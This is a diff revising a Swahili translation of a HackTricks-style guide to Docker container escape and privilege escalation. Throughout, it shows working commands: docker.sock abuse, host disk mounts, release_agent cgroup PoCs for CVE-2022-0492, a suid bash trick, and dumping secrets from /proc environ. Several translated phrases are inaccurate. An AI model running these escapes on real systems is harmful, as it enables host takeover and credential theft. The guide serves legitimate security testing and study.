@@ -1,45 +1,45 @@
-# Kuvunja Docker / Kuongeza Uteuzi wa Haki
+# Kuvunja Docker / Kuongeza Mamlaka
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvunja AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kuvamia AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks katika PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** unaotumia zana za jamii za **kisasa zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii za **juu zaidi** ulimwenguni.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Uteuzi wa Kiotomatiki na Kutoroka
+## Uchunguzi na Kutoroka Kiotomatiki
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Inaweza pia **kuteua kontena**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Zana hii ni **muhimu sana kuteua kontena uliyomo au hata kujaribu kutoroka kiotomatiki**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Zana muhimu kupata haki za kontena ili kupata njia za kutoroka
-* [**deepce**](https://github.com/stealthcopter/deepce): Zana ya kuteua na kutoroka kutoka kwa kontena
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Inaweza pia **kuchunguza kontena**
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Zana hii ni muhimu **kuchunguza kontena uliomo hata jaribu kutoroka kiotomatiki**
+* [**amicontained**](https://github.com/genuinetools/amicontained): Zana muhimu kupata mamlaka ambayo kontena ina ili kupata njia za kutoroka
+* [**deepce**](https://github.com/stealthcopter/deepce): Zana ya kuchunguza na kutoroka kutoka kwa kontena
 * [**grype**](https://github.com/anchore/grype): Pata CVE zilizomo kwenye programu iliyosanikishwa kwenye picha
 
-## Kutoroka kwa Soketi ya Docker Iliyowekwa
+## Kutoroka Kupitia Docker Socket Imewekwa
 
-Ikiwa kwa njia fulani unagundua kuwa **soketi ya docker imefungwa** ndani ya kontena ya docker, utaweza kutoroka kutoka kwake.\
-Hii kawaida hutokea kwenye kontena za docker ambazo kwa sababu fulani zinahitaji kuunganisha kwenye daemani ya docker ili kutekeleza hatua.
+Ikiwa kwa njia fulani unagundua kuwa **socket ya docker imeunganishwa** ndani ya kontena ya docker, utaweza kutoroka kutoka humo.\
+Hii kawaida hutokea kwenye kontena za docker ambazo kwa sababu fulani zinahitaji kuunganisha kwenye daemini ya docker kutekeleza vitendo.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-Katika kesi hii, unaweza kutumia amri za kawaida za docker kuwasiliana na daemon ya docker:
+Katika kesi hii unaweza kutumia amri za kawaida za docker kuwasiliana na daemon ya docker:
 ```bash
 #List images to use one
 docker images
@@ -54,13 +54,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-Katika kesi ambapo **docker socket iko mahali ambapo haikutarajiwa**, bado unaweza kuwasiliana nayo kwa kutumia amri ya **`docker`** na parameter ya **`-H unix:///path/to/docker.sock`**
+Ikiwa **socket ya docker iko mahali usitarajie** bado unaweza kuwasiliana nayo kutumia amri ya **`docker`** na parameter ya **`-H unix:///path/to/docker.sock`**
 {% endhint %}
 
-Docker daemon inaweza pia [kusikiliza kwenye bandari (kwa chaguo-msingi 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) au kwenye mifumo inayotegemea Systemd, mawasiliano na Docker daemon yanaweza kutokea kupitia soketi ya Systemd `fd://`.
+Daemon ya Docker inaweza pia [kusikiliza kwenye bandari (kwa chaguo msingi 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) au kwenye mifumo inayotegemea Systemd, mawasiliano na daemon ya Docker inaweza kutokea kupitia soketi ya Systemd `fd://`.
 
 {% hint style="info" %}
-Kwa kuongezea, angalia soketi za runtime za runtimes nyingine za kiwango cha juu:
+Kwa kuongezea, tafadhali angalia soketi za uendeshaji wa kiwango cha juu cha uendeshaji mwingine:
 
 * dockershim: `unix:///var/run/dockershim.sock`
 * containerd: `unix:///run/containerd/containerd.sock`
@@ -70,23 +70,23 @@ Kwa kuongezea, angalia soketi za runtime za runtimes nyingine za kiwango cha juu
 * ...
 {% endhint %}
 
-## Kutoroka kwa Kutumia Uwezo wa Ukiukaji
+## Kutoruhusu Uwezo wa Kutoroka
 
-Unapaswa kuchunguza uwezo wa kontena, ikiwa ina mojawapo ya uwezo ufuatao, huenda uweze kutoroka kutoka kwake: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Unapaswa kuangalia uwezo wa kontena, ikiwa ina mojawapo ya yafuatayo, unaweza kutoroka kutoka kwake: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-Unaweza kuchunguza uwezo wa kontena kwa kutumia **zana za otomatiki zilizotajwa hapo awali** au:
+Unaweza kuangalia uwezo wa sasa wa kontena kwa kutumia **zana za moja kwa moja zilizotajwa hapo awali** au:
 ```bash
 capsh --print
 ```
-Katika ukurasa ufuatao unaweza **kujifunza zaidi kuhusu uwezo wa linux** na jinsi ya kuvunja matumizi yao ili kutoroka/kuongeza mamlaka:
+Kwenye ukurasa ufuatao unaweza **kujifunza zaidi kuhusu uwezo wa linux** na jinsi ya kuvunja matumizi yao kutoroka/kupandisha vyeo:
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Kutoroka Kutoka Kwenye Kontena Zenye Mamlaka
+## Kutoroka kutoka kwenye Kontena yenye Mamlaka
 
-Kontena zenye mamlaka zinaweza kuundwa kwa kutumia bendera `--privileged` au kwa kuzima ulinzi maalum:
+Kontena yenye mamlaka inaweza kuundwa kwa bendera `--privileged` au kwa kulemaza ulinzi maalum:
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -98,7 +98,7 @@ Kontena zenye mamlaka zinaweza kuundwa kwa kutumia bendera `--privileged` au kwa
 * `--cgroupns=host`
 * `Mount /dev`
 
-Bendera ya `--privileged` inapunguza sana usalama wa kontena, ikitoa **upatikanaji usiozuiliwa wa kifaa** na kuzidi **ulinzi kadhaa**. Kwa maelezo zaidi, tafadhali rejelea nyaraka kuhusu athari kamili za `--privileged`.
+Bendera ya `--privileged` inapunguza sana usalama wa kontena, ikitoa **upatikanaji usiozuiliwa wa kifaa** na kukiuka **ulinzi kadhaa**. Kwa maelezo zaidi, tazama nyaraka kuhusu athari kamili za `--privileged`.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -106,23 +106,23 @@ Bendera ya `--privileged` inapunguza sana usalama wa kontena, ikitoa **upatikana
 
 ### Privileged + hostPID
 
-Kwa ruhusa hizi, unaweza tu **kwenda kwenye anga ya mchakato unaofanya kazi kwenye mwenyeji kama root** kama vile init (pid:1) kwa kutekeleza: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+Kwa ruhusa hizi unaweza tu **kwenda kwenye anga ya mchakato unaoendesha kwenye mwenyeji kama root** kama init (pid:1) kwa kufanya: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-Jaribu katika kontena kwa kutekeleza:
+Jaribu kwenye kontena kwa kutekeleza:
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
-### Wenye Haki Maalum
+### Wenye Haki
 
-Kwa kutumia bendera ya wenye haki maalum, unaweza kujaribu **kupata ufikivu wa diski ya mwenyeji** au kujaribu **kutoroka kwa kutumia release\_agent au njia nyingine za kutoroka**.
+Kwa bendera ya wenye haki unaweza kujaribu **kupata diski ya mwenyeji** au jaribu **kutoroka kwa kutumia release\_agent au njia nyingine za kutoroka**.
 
-Jaribu kubadilisha mipito ifuatayo kwenye chombo kwa kutekeleza:
+Jaribu kufanya upitishaji wa kisasa katika chombo kwa kutekeleza:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
 #### Kufunga Diski - Poc1
 
-Kontena za Docker zilizowekwa vizuri hazitaruhusu amri kama **fdisk -l**. Walakini, kwenye amri ya Docker iliyowekwa vibaya ambapo bendera `--privileged` au `--device=/dev/sda1` na uwezo umeelezwa, ni rahisi kupata mamlaka ya kuona diski ya mwenyeji.
+Vyombo vya docker vilivyo configure vizuri havitaruhusu amri kama **fdisk -l**. Hata hivyo, kwenye amri ya docker iliyopangwa vibaya ambapo bendera `--privileged` au `--device=/dev/sda1` na herufi kubwa imetajwa, inawezekana kupata mamlaka ya kuona diski ya mwenyeji.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -131,11 +131,11 @@ Kwa hivyo, kuchukua udhibiti wa kompyuta mwenyeji ni rahisi:
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-Na hapo! Sasa unaweza kupata mfumo wa faili wa mwenyeji kwa sababu umefungwa kwenye saraka ya `/mnt/hola`.
+Na voilà! Sasa unaweza kupata ufikiaji wa mfumo wa faili wa mwenyeji kwa sababu umefungwa kwenye folda ya `/mnt/hola`.
 
-#### Kuunganisha Diski - Poc2
+#### Kufunga Diski - Poc2
 
-Ndani ya chombo, mshambuliaji anaweza kujaribu kupata ufikiaji zaidi kwa mfumo wa uendeshaji wa mwenyeji kupitia kiasi cha hostPath kinachoweza kuandikwa kilichoundwa na kikundi. Hapa chini kuna mambo ya kawaida unayoweza kuchunguza ndani ya chombo ili uone ikiwa unaweza kutumia njia hii ya shambulio:
+Ndani ya kontena, mshambuliaji anaweza kujaribu kupata ufikiaji zaidi kwa mfumo wa uendeshaji wa mwenyeji kupitia kiasi cha mwenyeji kinachoweza kuandikwa kilichoundwa na kikundi. Hapa chini kuna vitu vya kawaida unavyoweza kuchunguza ndani ya kontena ili uone ikiwa unaweza kutumia njia hii ya mshambuliaji:
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -156,7 +156,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Kutoroka kwa Utekelezaji wa Haki kwa kutumia release\_agent uliopo ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Kutoroka kwa Haki kwa Kutumia release\_agent iliyopo ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
 {% code title="PoC ya Awali" %}
 ```bash
@@ -192,11 +192,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-{% endcode %}
-
-#### Kutoroka kwa Utekelezaji wa Haki Kupitia kutumia release_agent iliyoundwa ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
-
-{% code title="PoC ya Pili" %}
+#### Kutoroka kwa Haki kwa Kutumia release_agent iliyoundwa ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -246,9 +242,9 @@ Pata **maelezo ya mbinu** katika:
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Kutoroka kwa Utekelezaji wa Haki Kwa Kutumia release\_agent Bila Kujua Njia ya Kihusika - PoC3
+#### Kutoroka kwa Haki Kwa Kutumia release\_agent bila kujua njia ya kihesabu - PoC3
 
-Katika mbinu za awali, **njia kamili ya kontena ndani ya mfumo wa mwenyeji inafichuliwa**. Hata hivyo, hii sio kila wakati hali. Katika hali ambapo **haujui njia kamili ya kontena ndani ya mwenyeji**, unaweza kutumia mbinu hii:
+Katika mbinu za awali **njia kamili ya kontena ndani ya mfumo wa mwenyeji inafichuliwa**. Walakini, hii sio kila wakati hali. Katika hali ambapo **haujui njia kamili ya kontena ndani ya mwenyeji** unaweza kutumia mbinu hii:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -312,7 +308,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-Kutekeleza PoC ndani ya chombo chenye mamlaka kinapaswa kutoa matokeo kama haya:
+Kutekeleza PoC ndani ya chombo kilichopewa mamlaka kunapaswa kutoa matokeo kama:
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -340,9 +336,9 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Kutoroka kwa Utekelezaji wa Kipekee kwa Kutumia Kufunga Nyeti
+#### Kutoroka kwa Kibali Kwa Kutumia Kufunga Nyeti
 
-Kuna faili kadhaa ambazo zinaweza kufungwa ambazo hutoa **habari kuhusu mwenyeji wa chini**. Baadhi yao hata yanaweza kuashiria **kitu cha kutekelezwa na mwenyeji wakati kitu kinapotokea** (ambayo itawaruhusu mshambuliaji kutoroka kutoka kwenye kontena).\
+Kuna faili kadhaa ambazo zinaweza kufungwa ambazo hutoa **taarifa kuhusu mwenyeji wa chini**. Baadhi yao hata yanaweza kuashiria **kitu cha kutekelezwa na mwenyeji wakati kitu kinatokea** (ambacho kitamruhusu mshambuliaji kutoroka kutoka kwenye kontena).\
 Matumizi mabaya ya faili hizi yanaweza kuruhusu:
 
 * release\_agent (tayari imejadiliwa hapo awali)
@@ -351,7 +347,7 @@ Matumizi mabaya ya faili hizi yanaweza kuruhusu:
 * [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
 * [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
 
-Hata hivyo, unaweza kupata **faili nyeti nyingine** za kuangalia kwenye ukurasa huu:
+Hata hivyo, unaweza kupata **faili nyingine nyeti** za kuangalia kwenye ukurasa huu:
 
 {% content-ref url="sensitive-mounts.md" %}
 [sensitive-mounts.md](sensitive-mounts.md)
@@ -359,14 +355,14 @@ Hata hivyo, unaweza kupata **faili nyeti nyingine** za kuangalia kwenye ukurasa 
 
 ### Kufunga Kiholela
 
-Katika hali kadhaa utagundua kuwa **kontena ina kiasi fulani kilichofungwa kutoka kwenye mwenyeji**. Ikiwa kiasi hiki hakijasakinishwa vizuri, huenda uweze **kufikia/kubadilisha data nyeti**: Kusoma siri, kubadilisha ssh authorized\_keys...
+Katika matukio kadhaa utagundua kwamba **kontena ina kifafa fulani kilichofungwa kutoka kwa mwenyeji**. Ikiwa kifafa hiki hakijasakinishwa kwa usahihi unaweza kuwa na uwezo wa **kufikia/kubadilisha data nyeti**: Kusoma siri, kubadilisha ssh authorized\_keys...
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### Kupandisha Uthamani kwa kutumia 2 kasha na kufunga mwenyeji
+### Kupandisha Mamlaka kwa Kutumia Makompyuta 2 na Kufunga Kwenye Mwenyeji
 
-Ikiwa una ufikiaji kama **root ndani ya chombo** ambacho kina folda fulani kutoka kwa mwenyeji iliyofungwa na una **kutoroka kama mtumiaji asiye na haki kwenye mwenyeji** na una ufikiaji wa kusoma juu ya folda iliyofungwa.\
-Unaweza kuunda **faili ya bash suid** kwenye **folda iliyofungwa** ndani ya **chombo** na **kuitekeleza kutoka kwa mwenyeji** ili kupandisha uthamani.
+Ikiwa una ufikiaji kama **root ndani ya chombo** ambacho kina folda fulani kutoka kwa mwenyeji iliyofungwa na umetoka kama mtumiaji asiye na mamlaka kwa mwenyeji na una ufikiaji wa kusoma kwenye folda iliyofungwa.\
+Unaweza kuunda **faili ya bash suid** kwenye **folda iliyofungwa** ndani ya **chombo** na **kuitekeleza kutoka kwa mwenyeji** ili kupandisha mamlaka.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -374,14 +370,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Kupandisha Hadhi kwa Kutumia Sheli 2
+### Kupanda Mamlaka na Mabano 2
 
-Ikiwa una ufikiaji kama **root ndani ya chombo** na umefanikiwa kama mtumiaji asiye na mamlaka kwenye mwenyeji, unaweza kutumia sheli zote mbili kwa **kupandisha hadhi ndani ya mwenyeji** ikiwa una uwezo wa MKNOD ndani ya chombo (kwa chaguao ni hivyo) kama [**inavyoelezwa katika chapisho hili**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Kwa uwezo huo, mtumiaji wa root ndani ya chombo anaruhusiwa **kuunda faili za kifaa cha kuzuia**. Faili za kifaa ni faili maalum ambazo hutumiwa **kufikia vifaa vya chini na moduli za kernel**. Kwa mfano, faili ya kifaa cha kuzuia /dev/sda inaruhusu ufikiaji wa **kusoma data ghafi kwenye diski za mfumo**.
+Ikiwa una ufikiaji kama **root ndani ya chombo** na umetoka kama mtumiaji asiye na mamlaka kwa mwenyeji, unaweza kutumia mabano yote kwa **kupanda mamlaka ndani ya mwenyeji** ikiwa una uwezo wa MKNOD ndani ya chombo (kwa chaguo-msingi) kama [**inavyoelezwa katika chapisho hili**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Kwa uwezo kama huo, mtumiaji wa root ndani ya chombo ameruhusiwa **kuunda faili za kifaa cha kuzuia**. Faili za kifaa ni faili maalum zinazotumiwa **kufikia vifaa vya chini & moduli za kernel**. Kwa mfano, faili ya kifaa cha kuzuia /dev/sda inatoa ufikiaji wa **kusoma data ghafi kwenye diski za mifumo**.
 
-Docker inalinda dhidi ya matumizi mabaya ya faili za kifaa ndani ya vyombo kwa kutekeleza sera ya cgroup ambayo **inazuia operesheni za kusoma/kuandika kwenye faili za kifaa**. Walakini, ikiwa faili ya kifaa inaundwa ndani ya chombo, inakuwa inapatikana kutoka nje ya chombo kupitia saraka ya **/proc/PID/root/**. Upatikanaji huu unahitaji **mmiliki wa mchakato kuwa sawa** ndani na nje ya chombo.
+Docker inalinda dhidi ya matumizi mabaya ya vifaa vya kuzuia ndani ya vyombo kwa kutekeleza sera ya cgroup ambayo **inazuia operesheni za kusoma/kuandika kwenye vifaa vya kuzuia**. Walakini, ikiwa kifaa cha kuzuia **kinachoundwa ndani ya chombo**, kinakuwa kinapatikana kutoka nje ya chombo kupitia saraka ya **/proc/PID/root/**. Upatikanaji huu unahitaji **mmiliki wa mchakato awe sawa** ndani na nje ya chombo.
 
-Mfano wa **utumiaji mbaya** kutoka kwenye [**makala hii**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+Mfano wa **Udanganyifu** kutoka kwenye [**makala hii**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -419,13 +415,13 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-Ikiwa unaweza kupata michakato ya mwenyeji, utaweza kupata habari nyeti nyingi zilizohifadhiwa katika michakato hiyo. Chalaza maabara ya majaribio:
+Ikiwa unaweza kupata michakato ya mwenyeji utaweza kupata habari nyeti iliyohifadhiwa katika michakato hiyo. Tekeleza mtihani wa maabara:
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Kwa mfano, utaweza kuorodhesha michakato kwa kutumia kitu kama `ps auxn` na kutafuta maelezo nyeti katika amri hizo.
+Kwa mfano, utaweza kuorodhesha michakato inayotumia kitu kama `ps auxn` na kutafuta maelezo nyeti katika amri.
 
-Kisha, kwa kuwa unaweza **kufikia kila mchakato wa mwenyeji katika /proc/, unaweza tu kuiba siri zao za mazingira** kwa kukimbia:
+Kisha, kama unaweza **kufikia kila mchakato wa mwenyeji katika /proc/, unaweza tu kuiba siri zao za mazingira** kwa kukimbia:
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -434,7 +430,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-Unaweza pia **kupata ufikiaji wa maelezo ya faili ya michakato mingine na kusoma faili zilizofunguliwa**:
+Unaweza pia **kufikia maelezo mengine ya mchakato na kusoma faili zao zilizofunguliwa**:
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -447,48 +443,48 @@ cat /proc/635813/fd/4
 Unaweza pia **kuua michakato na kusababisha DoS**.
 
 {% hint style="warning" %}
-Ikiwa kwa njia fulani una **upatikanaji wa mamlaka juu ya mchakato nje ya kontena**, unaweza kukimbia kitu kama `nsenter --target <pid> --all` au `nsenter --target <pid> --mount --net --pid --cgroup` ili **kukimbia kabati na vizuizi sawa vya ns** (matumaini yake hakuna) **kama mchakato huo.**
+Ikiwa kwa namna fulani una **upatikanaji wa mamlaka juu ya mchakato nje ya chombo**, unaweza kukimbia kitu kama `nsenter --target <pid> --all` au `nsenter --target <pid> --mount --net --pid --cgroup` **kukimbia kabia na vikwazo sawa vya ns** (kwa matumaini hakuna) **kama mchakato huo.**
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Ikiwa chombo kimeundwa na dereva wa mtandao wa mwenyeji wa Docker (`--network=host`), mtandao wa chombo hicho hauta kuwa umetengwa kutoka kwa mwenyeji wa Docker (chombo hicho kinashiriki nafasi ya mtandao ya mwenyeji), na chombo hicho hakitapewa anwani yake ya IP ya kipekee. Kwa maneno mengine, **chombo hicho kinabana huduma zote moja kwa moja kwenye IP ya mwenyeji**. Zaidi ya hayo, chombo hicho kinaweza **kukamata trafiki yote ya mtandao ambayo mwenyeji anatuma na kupokea kwenye kiolesura kinachoshirikiwa `tcpdump -i eth0`**.
+Ikiwa chombo kilikonfigurwa na Dereva wa Uunganisho wa Mwenyeji wa Docker (`--network=host`), mtandao wa chombo hicho haujaachwa peke yake kutoka kwa mwenyeji wa Docker (chombo hushiriki uga wa mtandao wa mwenyeji), na chombo hicho hakiwi na anwani yake ya IP iliyotengwa. Kwa maneno mengine, **chombo hufunga huduma zote moja kwa moja kwa anwani ya IP ya mwenyeji**. Zaidi ya hayo, chombo hicho kinaweza **kukamata TRAFIKI YOTE ya mtandao ambayo mwenyeji** anatuma na kupokea kwenye kiolesura kilichoshirikiwa `tcpdump -i eth0`.
 
-Kwa mfano, unaweza kutumia hii kuchunguza na hata kudanganya trafiki kati ya mwenyeji na kielelezo cha metadata.
+Kwa mfano, unaweza kutumia hii kwa **kukamata na hata kughushi trafiki** kati ya mwenyeji na kielelezo cha metadata.
 
 Kama katika mifano ifuatayo:
 
-* [Maelezo: Jinsi ya kuwasiliana na Google SRE: Kupata kibao kwenye SQL ya wingu](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-* [Metadata service MITM inaruhusu kuongeza mamlaka ya msingi (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [Maelezo: Jinsi ya kuwasiliana na Google SRE: Kudondosha kabati katika SQL ya wingu](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [HUDUMA YA METADATA MITM inaruhusu upandishaji wa mamlaka ya msingi (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Pia utaweza kufikia **huduma za mtandao zilizobanwa kwenye localhost** ndani ya mwenyeji au hata kupata **ruhusa za metadata ya kifaa** (ambazo zinaweza kuwa tofauti na zile ambazo chombo kinaweza kupata).
+Pia utaweza kupata **huduma za mtandao zilizofungwa kwa localhost** ndani ya mwenyeji au hata kupata **ruhusa za metadata ya node** (ambazo zinaweza kutofautiana na zile ambazo chombo kinaweza kupata).
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Kwa kutumia `hostIPC=true`, unapata ufikiaji wa rasilimali za mawasiliano kati ya michakato (IPC) ya mwenyeji, kama vile **kumbukumbu iliyoshirikiwa** katika `/dev/shm`. Hii inaruhusu kusoma/kuandika ambapo rasilimali hizo za IPC zinatumika na michakato mingine ya mwenyeji au podi. Tumia `ipcs` kuangalia zaidi mifumo hii ya IPC.
+Kwa `hostIPC=true`, unapata ufikio wa rasilimali za mawasiliano kati ya michakato (IPC) ya mwenyeji, kama vile **kumbukumbu iliyoshirikiwa** katika `/dev/shm`. Hii inaruhusu kusoma/kuandika ambapo rasilimali sawa za IPC hutumiwa na michakato mingine ya mwenyeji au podi. Tumia `ipcs` kuchunguza zaidi mifumo hii ya IPC.
 
-* **Angalia /dev/shm** - Tafuta faili yoyote katika eneo hili la kumbukumbu iliyoshirikiwa: `ls -la /dev/shm`
-* **Angalia vituo vya IPC vilivyopo** - Unaweza kuangalia ikiwa kuna vituo vya IPC vinavyotumiwa na `/usr/bin/ipcs`. Angalia hivi: `ipcs -a`
+* **Chunguza /dev/shm** - Tafuta faili yoyote katika eneo hili la kumbukumbu iliyoshirikiwa: `ls -la /dev/shm`
+* **Chunguza vifaa vya IPC vilivyopo** - Unaweza kuangalia ikiwa vifaa vyovyote vya IPC vinatumika kwa kutumia `/usr/bin/ipcs`. Angalia hivi: `ipcs -a`
 
 ### Rudisha uwezo
 
-Ikiwa syscall **`unshare`** haijazuiliwa, unaweza kurejesha uwezo wote kwa kukimbia:
+Ikiwa syscall **`unshare`** haijazuiliwa unaweza kurejesha uwezo wote ukitekeleza:
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-### Mabaya ya nafasi ya mtumiaji kupitia symlink
+### Mabaya ya eneo la mtumiaji kupitia symlink
 
-Mbinu ya pili iliyoelezwa katika chapisho [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) inaonyesha jinsi unavyoweza kutumia bind mounts na user namespaces, kuathiri faili ndani ya mwenyeji (katika kesi hiyo maalum, kufuta faili).
